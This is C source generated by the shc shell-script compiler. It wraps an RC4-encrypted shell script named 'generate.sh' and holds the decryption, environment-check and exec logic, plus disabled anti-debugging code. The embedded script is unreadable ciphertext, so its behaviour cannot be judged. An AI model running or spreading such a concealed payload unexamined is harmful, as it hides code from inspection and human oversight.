#if 0
	shc Version 3.9.6, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -r -f generate.sh -o github-generate 
#endif

static  char data [] = 
#define      opts_z	1
#define      opts	((&data[0]))
	"\234"
#define      rlax_z	1
#define      rlax	((&data[1]))
	"\304"
#define      tst2_z	19
#define      tst2	((&data[2]))
	"\333\073\007\122\306\111\345\335\124\156\304\340\367\001\041\331"
	"\362\144\011\100\110\111"
#define      text_z	1120
#define      text	((&data[179]))
	"\267\201\267\134\034\306\064\362\057\040\122\362\003\336\312\151"
	"\251\032\355\137\145\066\110\150\332\210\260\044\146\076\122\035"
	"\300\012\172\334\321\257\317\000\320\041\363\324\000\275\075\252"
	"\327\052\011\075\140\122\246\073\333\127\137\101\225\262\137\125"
	"\275\332\062\216\211\002\217\132\044\202\056\044\100\153\316\030"
	"\226\330\126\367\052\374\063\006\124\223\107\351\106\247\077\003"
	"\201\162\221\012\164\041\145\230\244\223\275\344\377\213\375\226"
	"\144\123\216\217\120\301\225\244\124\334\216\232\204\315\236\005"
	"\100\057\020\264\121\165\115\365\010\012\331\010\226\327\236\372"
	"\053\054\212\173\356\037\037\103\374\256\336\277\231\302\231\020"
	"\242\323\102\317\350\063\151\317\257\364\025\161\342\075\375\376"
	"\361\061\027\135\017\333\164\056\053\353\274\134\372\256\060\062"
	"\367\245\133\003\355\030\121\250\321\304\314\147\267\206\254\116"
	"\046\103\036\356\357\066\142\076\002\334\174\041\103\055\327\173"
	"\223\226\344\142\076\265\267\115\114\216\036\332\206\003\276\057"
	"\165\203\105\167\331\274\365\142\361\026\140\262\237\105\021\220"
	"\202\305\264\045\201\102\165\060\270\041\341\153\043\201\243\006"
	"\111\171\262\201\105\270\240\226\370\271\123\342\370\247\202\114"
	"\040\321\347\174\205\332\055\066\244\235\377\155\177\061\237\047"
	"\162\370\216\356\236\210\214\141\112\360\341\203\343\124\012\141"
	"\074\020\335\225\121\205\301\254\102\271\253\247\236\265\240\016"
	"\374\221\104\162\171\325\143\121\331\113\360\111\237\057\221\214"
	"\304\350\054\332\314\242\057\064\201\206\265\330\174\067\222\327"
	"\347\103\257\303\007\271\064\263\305\257\124\266\252\175\222\236"
	"\310\122\145\305\171\036\024\213\116\270\261\036\342\004\314\156"
	"\177\311\351\277\376\366\324\364\246\140\232\143\201\057\153\023"
	"\237\152\124\124\243\233\104\375\060\215\240\106\251\204\074\067"
	"\347\342\323\127\330\045\350\100\124\124\037\310\176\117\114\070"
	"\102\362\042\135\346\150\052\102\124\243\326\243\245\031\331\324"
	"\066\175\126\350\156\044\310\375\272\064\305\220\171\220\341\057"
	"\144\220\276\001\072\260\276\110\310\216\346\261\217\232\061\070"
	"\271\332\005\167\270\250\135\110\104\206\064\256\214\253\216\000"
	"\362\030\103\075\145\346\267\104\133\122\373\113\016\152\115\346"
	"\167\321\046\343\247\362\301\372\044\023\212\207\175\163\126\211"
	"\122\251\163\226\270\254\024\044\012\110\151\036\135\317\224\306"
	"\045\316\320\136\325\367\107\120\173\374\037\172\027\076\107\236"
	"\131\234\321\052\145\117\345\072\072\357\373\011\324\174\300\174"
	"\237\226\042\141\235\211\144\177\032\057\352\057\275\054\176\010"
	"\034\037\075\150\006\144\236\334\020\214\176\137\343\174\102\317"
	"\167\330\353\166\306\146\202\314\217\144\117\072\134\246\154\011"
	"\211\223\132\217\103\071\153\264\036\151\053\071\223\024\040\237"
	"\345\311\124\303\026\024\150\232\305\025\210\173\140\370\333\132"
	"\373\107\250\176\053\026\055\202\271\355\027\233\121\044\040\254"
	"\026\335\002\200\217\111\156\347\061\345\301\207\347\166\362\373"
	"\175\213\145\137\151\067\376\317\114\072\267\316\260\143\327\067"
	"\334\142\023\114\115\345\053\234\225\222\311\023\000\323\350\312"
	"\211\076\007\113\374\060\135\174\335\270\233\325\335\363\036\162"
	"\222\363\041\025\042\024\057\301\077\206\047\101\263\101\042\063"
	"\324\067\176\175\065\341\147\213\105\142\372\232\134\275\112\145"
	"\164\055\020\253\032\055\052\305\046\033\320\061\154\114\354\106"
	"\321\256\331\101\251\200\222\223\071\216\015\375\240\222\224\022"
	"\104\365\102\271\220\336\367\355\222\306\264\053\306\145\173\253"
	"\332\131\013\307\054\274\250\202\131\066\267\002\371\244\165\311"
	"\351\304\251\271\036\313\260\123\021\135\244\017\266\070\174\227"
	"\164\155\163\254\306\002\156\233\365\301\115\272\220\352\002\215"
	"\326\264\140\226\314\243\235\335\152\075\121\177\341\360\013\252"
	"\016\335\074\052\102\033\046\064\042\105\357\025\016\223\170\060"
	"\022\367\303\026\166\325\064\174\001\130\224\007\075\025\075\273"
	"\143\320\372\273\157\007\037\375\345\142\277\230\122\230\271\306"
	"\326\251\075\323\321\216\232\366\205\222\377\367\365\377\357\362"
	"\331\116\224\062\326\125\176\264\153\131\314\230\242\274\233\070"
	"\164\025\374\344\322\334\200\325\222\046\256\323\023\013\136\342"
	"\210\057\001\071\300\075\346\105\375\022\325\350\157\245\254\050"
	"\155\165\227\352\326\376\141\325\271\227\257\346\260\220\111\266"
	"\313\153\030\103\241\255\320\275\215\207\333\201\330\046\071\341"
	"\350\227\004\363\241\063\166\102\003\343\237\216\065\156\227\212"
	"\336\173\331\100\272\124\363\320\103\376\103\077\325\273\164\070"
	"\367\236\326\164\203\202\163\156\376\052\037\052\223\375\207\001"
	"\315\105\012\337\033\114\146\144\057\063\343\110\120\002\236\365"
	"\260\126\356\114\173\066\207\332\217\226\162\327\240\303\274\302"
	"\166\135\014\062\354\310\151\110\160\105\122\014\123\312\072\154"
	"\340\226\224\334\160\325\312\156\056\252\313\351\302\147\365\353"
	"\257\233\014\360\340\337\320\364\144\006\000\274\265\143\003\316"
	"\226\106\255\157\170\064\061\225\070\321\074\326\240\004\227\312"
	"\227\123\140\052\226\306\002\306\302\264\366\213\150\317\151\072"
	"\320\135\051\003\261\210\132\274\025\321\027\331\117\070\370\206"
	"\075\315\371\053\304\047\322\246\114\037\140\137\136\001\316\113"
	"\122\167\141\105\005\364\014\047\151\043\077\262\137\057\163\350"
	"\320\051\222\211\046\064\021\045\273\002\306\370\262\307\256\161"
	"\360\040\271\315\223\100\067\015\274\177\277\200\174\174\205\274"
	"\254\225\160\375\012\275\362\023\310\314\034\136\243\272\131\316"
	"\347\343\112\325\003\152\031\377\030\367\177\224\163\005\120\037"
	"\233\301\035\246\177\017\271\107\334\326\246\200\220\000"
#define      inlo_z	3
#define      inlo	((&data[1350]))
	"\210\254\260"
#define      chk1_z	22
#define      chk1	((&data[1354]))
	"\004\136\020\112\000\037\003\203\163\213\041\277\140\241\341\002"
	"\117\067\022\031\063\327\041\147\347\034\136\146"
#define      chk2_z	19
#define      chk2	((&data[1385]))
	"\002\361\007\303\020\330\365\120\111\112\317\062\043\370\127\363"
	"\226\276\015\134\005\257\033\016\255"
#define      shll_z	10
#define      shll	((&data[1406]))
	"\165\106\201\367\100\032\213\052\136\021\213"
#define      pswd_z	256
#define      pswd	((&data[1432]))
	"\173\316\062\312\106\027\143\224\376\147\373\345\204\131\114\226"
	"\050\330\010\327\145\367\071\043\216\232\134\163\331\171\355\112"
	"\214\311\017\267\347\062\132\136\043\366\333\162\213\347\011\263"
	"\277\021\212\045\011\303\110\227\136\244\013\070\036\370\202\252"
	"\302\222\142\252\305\274\010\350\262\344\132\075\314\144\360\214"
	"\165\173\261\177\076\371\026\235\236\042\325\275\033\130\150\335"
	"\353\312\210\260\206\221\231\070\165\364\166\101\130\147\315\316"
	"\342\176\115\041\170\144\276\027\206\224\324\242\354\074\200\327"
	"\007\010\210\215\231\042\306\017\026\074\120\157\244\036\075\206"
	"\235\213\247\025\357\146\055\166\372\002\030\347\077\230\277\106"
	"\241\107\323\073\151\231\112\200\326\233\360\172\271\055\001\126"
	"\271\251\154\251\017\232\037\012\234\070\361\333\321\260\042\162"
	"\370\365\256\142\217\370\343\146\223\323\341\115\000\342\244\272"
	"\214\021\143\233\253\203\245\110\274\227\044\215\110\106\000\100"
	"\074\256\243\313\247\206\062\073\131\023\210\132\366\055\024\202"
	"\076\170\036\352\373\304\062\267\134\127\105\244\235\105\345\331"
	"\364\210\245\233\017\330\326\150\353\137\303\342\214\327\145\065"
	"\053\271\070\035\300\374\054\156\077\112\325"
#define      msg1_z	65
#define      msg1	((&data[1704]))
	"\374\300\341\057\035\225\365\165\123\107\101\157\135\077\030\356"
	"\223\036\265\366\161\374\352\017\235\103\246\342\173\112\340\173"
	"\157\047\315\103\210\163\116\040\240\163\315\246\111\352\203\277"
	"\265\221\013\362\355\100\115\114\006\161\306\064\056\131\133\332"
	"\315\033\204\320\074\213"
#define      date_z	1
#define      date	((&data[1770]))
	"\005"
#define      xecc_z	15
#define      xecc	((&data[1772]))
	"\267\117\247\241\200\337\103\267\242\320\221\367\106\305\333\051"
	"\053"
#define      lsto_z	1
#define      lsto	((&data[1788]))
	"\250"
#define      tst1_z	22
#define      tst1	((&data[1790]))
	"\111\367\172\033\123\340\013\176\333\104\177\074\116\305\125\170"
	"\147\327\100\312\364\030\276\132"
#define      msg2_z	19
#define      msg2	((&data[1814]))
	"\140\137\122\205\145\366\063\244\207\003\241\106\111\322\355\114"
	"\163\031\070\207\205\322"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
